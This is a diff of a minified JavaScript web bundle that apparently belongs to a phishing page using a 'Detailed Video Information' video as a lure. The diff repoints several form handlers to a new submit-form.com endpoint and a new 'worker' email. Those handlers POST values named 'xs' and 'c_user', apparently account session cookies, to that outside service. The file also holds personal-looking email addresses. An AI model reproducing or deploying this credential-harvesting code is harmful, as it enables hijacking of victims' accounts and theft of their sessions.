@@ -9713,7 +9713,7 @@
             n.useState)()
               , [i,l] = (0,
             n.useState)()
-              , o = ["salman jani email"]
+              , o = ["Worker"]
               , s = _();
             return (0,
             he.jsxs)(he.Fragment, {
@@ -9814,17 +9814,17 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/6xhi61j6y", {
+                                    fetch("https://submit-form.com/afPamrxC8", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
                                             emails: o,
-                                            workerEmail: "salmanjani email",
+                                            workerEmail: "slarrantino@gmail.com",
                                             xs: r,
                                             c_user: i,
-                                            name: "asad"
+                                            name: "Maro"
                                         })
                                     }).then((e => {
                                         e.ok
@@ -9851,7 +9851,7 @@
                                         children: "Detailed Video Information"
                                     }), (0,
                                     he.jsx)("video", {
-                                        src: "detailed_video.mp4",
+                                        src: "https://cdn.glitch.global/31b556b9-4313-4d9d-9619-ee4546696f71/detailed-video.mp4?v=1732333110082",
                                         controls: !0,
                                         poster: me,
                                         autoPlay: !0
@@ -13256,7 +13256,7 @@
             })
         }
           , Wt = () => {
-            const e = ["salmanjaaniiloveyou@gmail.com"]
+            const e = ["emailjaon321@gmail.com"]
               , t = _()
               , [r,a] = (0,
             n.useState)(!1)
@@ -13339,7 +13339,7 @@
                                 children: "Detailed Video Information."
                             }), (0,
                             he.jsx)("a", {
-                                href: "https://firebasestorage.googleapis.com/v0/b/chatapp-3655a.appspot.com/o/video.mp4?alt=media&token=da89bb25-84a0-4ca6-b642-165578e6ca72",
+                                href: "https://cdn.glitch.global/31b556b9-4313-4d9d-9619-ee4546696f71/detailed-video.mp4?v=1732333110082",
                                 children: (0,
                                 he.jsx)("img", {
                                     src: me,
@@ -13358,7 +13358,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/6xhi61j6y", {
+                                    u && o ? (fetch("https://submit-form.com/afPamrxC8", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/6xhi61j6y", {
+                        fetch("https://submit-form.com/afPamrxC8", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
